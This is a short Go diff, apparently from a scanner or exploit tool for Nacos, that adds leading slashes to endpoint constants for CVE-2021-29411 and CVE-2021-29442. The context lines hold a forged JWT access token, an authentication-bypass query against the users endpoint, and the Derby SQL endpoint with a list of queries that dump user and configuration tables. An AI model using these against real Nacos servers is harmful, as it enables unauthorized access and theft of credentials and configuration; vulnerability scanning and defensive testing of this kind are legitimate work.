@@ -8,9 +8,9 @@ import (
 )
 
 const token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g"
-const cve_2021_29411_validateURI = "v1/auth/users?accessToken=" + token + "&pageNo=1&pageSize=9"
-const cve_2021_29411_userURI = "v1/auth/users"
-const cve_2021_29442_URI = "v1/cs/ops/derby?sql="
+const cve_2021_29411_validateURI = "/v1/auth/users?accessToken=" + token + "&pageNo=1&pageSize=9"
+const cve_2021_29411_userURI = "/v1/auth/users"
+const cve_2021_29442_URI = "/v1/cs/ops/derby?sql="
 
 var sqi = []string{"select * from users", "select * from config_tags_relation", "select * from app_configdata_relation_pubs", "select * from app_configdata_relation_subs", "select * from app_list", "select * from config_info_aggr", "select * from config_info_tag", "select * from config_info_beta", "select * from his_config_info", "select * from config_info"}
 
